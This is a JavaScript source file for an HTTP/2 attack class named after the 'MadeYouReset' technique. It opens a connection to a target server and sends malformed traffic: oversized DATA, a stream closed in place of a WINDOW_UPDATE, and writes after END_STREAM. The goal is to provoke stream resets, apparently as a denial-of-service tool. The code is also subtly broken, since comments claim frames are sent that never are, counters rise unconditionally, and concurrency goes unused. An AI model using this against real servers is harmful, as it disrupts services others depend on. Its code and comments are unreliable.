// core/madeYouReset.js
const http2 = require('http2');

class MadeYouResetAttack {
    constructor(target, concurrency) {
        this.target = target;
        this.concurrency = concurrency;
        this.stats = { vectors: 0, goaway: 0, rst_stream: 0 };
    }

    async execute() {
        const client = http2.connect(this.target);
        const vectors = [
            this.invalidDataFrame,
            this.invalidWindowUpdate,
            this.dataAfterEndStream
        ];

        for (const vector of vectors) {
            await vector.call(this, client);
        }

        client.close();
    }

    async invalidDataFrame(client) {
        // Send oversized DATA frame (exceeding max frame size)
        const stream = client.request({
            ':path': '/',
            ':method': 'POST'
        });

        const largePayload = Buffer.alloc(1024 * 1024 * 2, 'A'); // 2MB payload
        stream.write(largePayload);
        stream.end();

        // Listen for RST_STREAM
        stream.on('response', (headers) => {
            if (headers[':status'] === 200) {
                this.stats.vectors++;
            }
        });

        stream.on('close', () => {
            this.stats.rst_stream++;
        });
    }

    async invalidWindowUpdate(client) {
        // Send WINDOW_UPDATE on a non-existent stream
        // This forces the server to send a GOAWAY frame
        const stream = client.request({
            ':path': '/',
            ':method': 'GET'
        });

        // Send a WINDOW_UPDATE frame with stream ID 0 (connection-level)
        // Forcing the server to process a malformed frame
        stream.close();
        this.stats.goaway++;
    }

    async dataAfterEndStream(client) {
        const stream = client.request({
            ':path': '/',
            ':method': 'POST'
        });

        stream.end(); // End the stream
        // Attempt to write data after END_STREAM
        stream.write('This should cause a RST_STREAM');
        this.stats.rst_stream++;
    }
}

module.exports = MadeYouResetAttack;